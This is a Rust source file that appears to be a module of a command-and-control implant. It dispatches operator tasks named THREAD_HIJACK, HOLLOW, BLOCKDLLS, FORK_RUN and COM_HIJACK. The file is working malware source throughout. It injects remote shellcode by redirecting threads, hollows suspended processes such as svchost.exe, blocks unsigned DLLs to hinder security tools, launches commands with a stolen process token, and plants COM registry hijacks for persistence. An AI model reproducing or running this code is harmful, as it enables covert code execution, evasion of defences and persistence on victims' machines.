#![allow(dead_code, non_snake_case)]
// Advanced process injection commands: THREAD_HIJACK, HOLLOW, BLOCKDLLS, FORK_RUN, COM_HIJACK.

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Threading::{
    OpenProcess, OpenThread, SuspendThread, ResumeThread, WaitForSingleObject,
    OpenProcessToken, CreateProcessW, CreateProcessWithTokenW,
    SetProcessMitigationPolicy, ProcessSignaturePolicy,
    PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, THREAD_ALL_ACCESS, CREATE_SUSPENDED,
    STARTUPINFOW, PROCESS_INFORMATION,
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, GetThreadContext, SetThreadContext,
    CONTEXT, CONTEXT_FULL_AMD64,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next,
    THREADENTRY32, TH32CS_SNAPTHREAD,
};
use windows_sys::Win32::Security::{
    DuplicateTokenEx, SecurityImpersonation, TokenPrimary,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
};
use crate::transport::{AgentTransport, TaskWire};

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

fn shell(cmd: &str) -> String {
    super::shell(cmd)
}

// ── THREAD_HIJACK ─────────────────────────────────────────────────────────────

unsafe fn thread_hijack(pid: u32, sc: &[u8]) -> String {
    // Open target process and allocate RW memory for the shellcode.
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 {
        return format!("OpenProcess failed (err {})", GetLastError());
    }

    let mem = VirtualAllocEx(
        hproc, std::ptr::null(), sc.len(),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if mem.is_null() {
        CloseHandle(hproc);
        return format!("VirtualAllocEx failed (err {})", GetLastError());
    }

    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);

    let mut old = 0u32;
    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);

    // Find a thread belonging to the target process.
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE {
        CloseHandle(hproc);
        return "CreateToolhelp32Snapshot failed".into();
    }
    let mut te: THREADENTRY32 = std::mem::zeroed();
    te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut target_tid = 0u32;
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid {
                target_tid = te.th32ThreadID;
                break;
            }
            if Thread32Next(snap, &mut te) == 0 {
                break;
            }
        }
    }
    CloseHandle(snap);

    if target_tid == 0 {
        CloseHandle(hproc);
        return "no thread found in target process".into();
    }

    // Suspend, patch RIP to shellcode address, resume.
    let hthread = OpenThread(THREAD_ALL_ACCESS, 0, target_tid);
    if hthread == 0 {
        CloseHandle(hproc);
        return format!("OpenThread failed (err {})", GetLastError());
    }

    SuspendThread(hthread);

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if GetThreadContext(hthread, &mut ctx) != 0 {
        ctx.Rip = mem as u64;
        SetThreadContext(hthread, &ctx);
    }

    ResumeThread(hthread);
    CloseHandle(hthread);
    CloseHandle(hproc);

    format!("[+] thread {} hijacked in PID {} ({} bytes at {:#x})",
        target_tid, pid, sc.len(), mem as u64)
}

// ── HOLLOW ────────────────────────────────────────────────────────────────────

unsafe fn hollow(target_exe: &str, pe_bytes: &[u8]) -> String {
    if pe_bytes.len() < 0x40 {
        return "payload too small".into();
    }
    // Raw shellcode path when payload is not a PE.
    if pe_bytes[0] != b'M' || pe_bytes[1] != b'Z' {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let mut target_w = wide(target_exe);
        if CreateProcessW(
            std::ptr::null(), target_w.as_mut_ptr(),
            std::ptr::null(), std::ptr::null(), 0,
            CREATE_SUSPENDED, std::ptr::null(), std::ptr::null(),
            &si, &mut pi,
        ) == 0 {
            return format!("CreateProcessW failed (err {})", GetLastError());
        }
        let mem = VirtualAllocEx(
            pi.hProcess, std::ptr::null(), pe_bytes.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if mem.is_null() {
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            return format!("VirtualAllocEx failed (err {})", GetLastError());
        }
        let mut written = 0usize;
        WriteProcessMemory(pi.hProcess, mem, pe_bytes.as_ptr() as *const _, pe_bytes.len(), &mut written);
        let mut old = 0u32;
        VirtualProtectEx(pi.hProcess, mem, pe_bytes.len(), PAGE_EXECUTE_READ, &mut old);
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;
        if GetThreadContext(pi.hThread, &mut ctx) != 0 {
            ctx.Rip = mem as u64;
            SetThreadContext(pi.hThread, &ctx);
        }
        ResumeThread(pi.hThread);
        let pid = pi.dwProcessId;
        let addr = mem as u64;
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return format!("[+] hollow: {} PID={} sc={:#x} ({} B)", target_exe, pid, addr, pe_bytes.len());
    }
    let e_lfanew = *pe_bytes.as_ptr().add(0x3c).cast::<i32>() as usize;
    // Need room for: PE sig (4) + FileHeader (20) + enough of OptionalHeader64 (≥96 bytes).
    if e_lfanew.saturating_add(4 + 20 + 96) > pe_bytes.len() {
        return "invalid PE headers (e_lfanew out of range)".into();
    }

    let nt = pe_bytes.as_ptr().add(e_lfanew);
    if *nt.cast::<u32>() != 0x0000_4550 {
        return "not a PE file (bad signature)".into();
    }

    // FileHeader is at nt+4; OptionalHeader starts at nt+4+20 = nt+24.
    let file_hdr  = nt.add(4);
    let opt       = nt.add(24);          // OptionalHeader64

    let num_sections = *file_hdr.add(2).cast::<u16>() as usize;
    let opt_size     = *file_hdr.add(16).cast::<u16>() as usize;

    // OptionalHeader64 offsets:
    //   +16  AddressOfEntryPoint (u32)
    //   +24  ImageBase           (u64)
    //   +56  SizeOfImage         (u32)
    //   +60  SizeOfHeaders       (u32)
    let entry_rva      = *opt.add(16).cast::<u32>();
    let image_base     = *opt.add(24).cast::<u64>();
    let size_of_image  = *opt.add(56).cast::<u32>();
    let size_of_hdrs   = *opt.add(60).cast::<u32>() as usize;

    // Create target process suspended.
    let mut si: STARTUPINFOW = std::mem::zeroed();
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let mut target_w = wide(target_exe);

    if CreateProcessW(
        std::ptr::null(), target_w.as_mut_ptr(),
        std::ptr::null(), std::ptr::null(), 0,
        CREATE_SUSPENDED, std::ptr::null(), std::ptr::null(),
        &si, &mut pi,
    ) == 0 {
        return format!("CreateProcessW failed (err {})", GetLastError());
    }

    // Try to allocate at the PE's preferred base; fall back to any address.
    let actual_base = {
        let b = VirtualAllocEx(
            pi.hProcess, image_base as *const _,
            size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        );
        if !b.is_null() {
            b
        } else {
            let b2 = VirtualAllocEx(
                pi.hProcess, std::ptr::null(),
                size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            );
            if b2.is_null() {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return format!("VirtualAllocEx failed (err {})", GetLastError());
            }
            b2
        }
    };

    let mut written = 0usize;

    // Copy PE headers.
    let hdrs_to_copy = size_of_hdrs.min(pe_bytes.len());
    WriteProcessMemory(
        pi.hProcess, actual_base,
        pe_bytes.as_ptr() as *const _, hdrs_to_copy, &mut written,
    );

    // Copy sections.
    let sec_table = nt.add(4 + 20 + opt_size);
    for i in 0..num_sections {
        let sec      = sec_table.add(i * 40);
        let virt_rva = *sec.add(12).cast::<u32>() as usize;
        let raw_size = *sec.add(16).cast::<u32>() as usize;
        let raw_off  = *sec.add(20).cast::<u32>() as usize;

        if raw_size == 0 { continue; }
        if raw_off.saturating_add(raw_size) > pe_bytes.len() { continue; }

        let dest = (actual_base as usize + virt_rva) as *const _;
        WriteProcessMemory(
            pi.hProcess, dest,
            pe_bytes.as_ptr().add(raw_off) as *const _, raw_size, &mut written,
        );
    }

    // Patch the main thread's RIP to the new entry point, then resume.
    let entry_point = actual_base as u64 + entry_rva as u64;
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if GetThreadContext(pi.hThread, &mut ctx) != 0 {
        ctx.Rip = entry_point;
        SetThreadContext(pi.hThread, &ctx);
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    format!("[+] hollowed {} | base={:#x} entry={:#x} PID={}",
        target_exe, actual_base as u64, entry_point, pi.dwProcessId)
}

// ── BLOCKDLLS ─────────────────────────────────────────────────────────────────

fn blockdlls() -> String {
    // PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY: DWORD where bit 0 = MicrosoftSignedOnly.
    let policy: u32 = 1u32;
    let ok = unsafe {
        SetProcessMitigationPolicy(
            ProcessSignaturePolicy,
            &policy as *const u32 as *const _,
            std::mem::size_of::<u32>(),
        )
    };
    if ok != 0 {
        "[+] blockdlls: MicrosoftSignedOnly policy applied".to_string()
    } else {
        format!("SetProcessMitigationPolicy failed (err {})", unsafe { GetLastError() })
    }
}

// ── FORK_RUN ──────────────────────────────────────────────────────────────────

unsafe fn fork_run(src_pid: u32, cmd: &str) -> String {
    // Open source process and duplicate its primary token.
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, src_pid);
    if hproc == 0 {
        return format!("OpenProcess failed (err {})", GetLastError());
    }

    let mut htok: HANDLE = 0;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);

    let mut hdup: HANDLE = 0;
    if DuplicateTokenEx(
        htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenPrimary, &mut hdup,
    ) == 0 {
        CloseHandle(htok);
        return format!("DuplicateTokenEx failed (err {})", GetLastError());
    }
    CloseHandle(htok);

    // Launch the command with the duplicated token.
    let mut si: STARTUPINFOW = std::mem::zeroed();
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let mut cmd_w = wide(cmd);

    if CreateProcessWithTokenW(
        hdup, 0,
        std::ptr::null(), cmd_w.as_mut_ptr(),
        0, std::ptr::null(), std::ptr::null(),
        &si, &mut pi,
    ) == 0 {
        CloseHandle(hdup);
        return format!("CreateProcessWithTokenW failed (err {})", GetLastError());
    }

    CloseHandle(hdup);
    WaitForSingleObject(pi.hProcess, 30_000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    format!("[+] fork_run: '{}' launched with token from PID {} (child PID={})",
        cmd, src_pid, pi.dwProcessId)
}

// ── COM_HIJACK ────────────────────────────────────────────────────────────────

fn com_hijack(clsid: &str, dll_path: &str) -> String {
    shell(&format!(
        "reg add \"HKCU\\Software\\Classes\\CLSID\\{}\\InprocServer32\" /ve /t REG_SZ /d \"{}\" /f 2>&1",
        clsid, dll_path
    ))
}

fn com_hijack_rm(clsid: &str) -> String {
    shell(&format!(
        "reg delete \"HKCU\\Software\\Classes\\CLSID\\{}\" /f 2>&1",
        clsid
    ))
}

// ── Dispatch ──────────────────────────────────────────────────────────────────

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "THREAD_HIJACK" => {
            if task.payload.is_empty() {
                t.send_result(task.id, "", "THREAD_HIJACK requires a shellcode payload");
                return true;
            }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok()
                .and_then(|v| v.get("pid").and_then(|p| p.as_u64()))
                .unwrap_or(0) as u32;
            if pid == 0 {
                t.send_result(task.id, "", "THREAD_HIJACK requires {\"pid\":N}");
                return true;
            }
            let r = unsafe { thread_hijack(pid, &task.payload) };
            t.send_result(task.id, &r, "");
            true
        }

        "HOLLOW" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let target = j.get("target")
                .and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\svchost.exe");
            if task.payload.is_empty() {
                t.send_result(task.id, "", "HOLLOW requires a payload");
                return true;
            }
            let r = unsafe { hollow(target, &task.payload) };
            t.send_result(task.id, &r, "");
            true
        }

        "BLOCKDLLS" => {
            let r = blockdlls();
            t.send_result(task.id, &r, "");
            true
        }

        "FORK_RUN" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let pid = j.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            let cmd = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("cmd.exe /c whoami");
            if pid == 0 {
                t.send_result(task.id, "", "FORK_RUN requires {\"pid\":N,\"cmd\":\"...\"}");
                return true;
            }
            let r = unsafe { fork_run(pid, cmd) };
            t.send_result(task.id, &r, "");
            true
        }

        "COM_HIJACK" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let clsid    = j.get("clsid").and_then(|v| v.as_str()).unwrap_or("");
            let dll_path = j.get("dll").and_then(|v| v.as_str()).unwrap_or("");
            if clsid.is_empty() || dll_path.is_empty() {
                t.send_result(task.id, "", "COM_HIJACK requires {\"clsid\":\"...\",\"dll\":\"...\"}");
                return true;
            }
            let r = com_hijack(clsid, dll_path);
            t.send_result(task.id, &r, "");
            true
        }

        "COM_HIJACK_RM" => {
            let clsid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok()
                .and_then(|v| v.get("clsid").and_then(|c| c.as_str()).map(String::from))
                .unwrap_or_else(|| task.args.trim_matches('"').to_string());
            if clsid.is_empty() {
                t.send_result(task.id, "", "COM_HIJACK_RM requires {\"clsid\":\"...\"}");
                return true;
            }
            let r = com_hijack_rm(&clsid);
            t.send_result(task.id, &r, "");
            true
        }

        _ => false,
    }
}
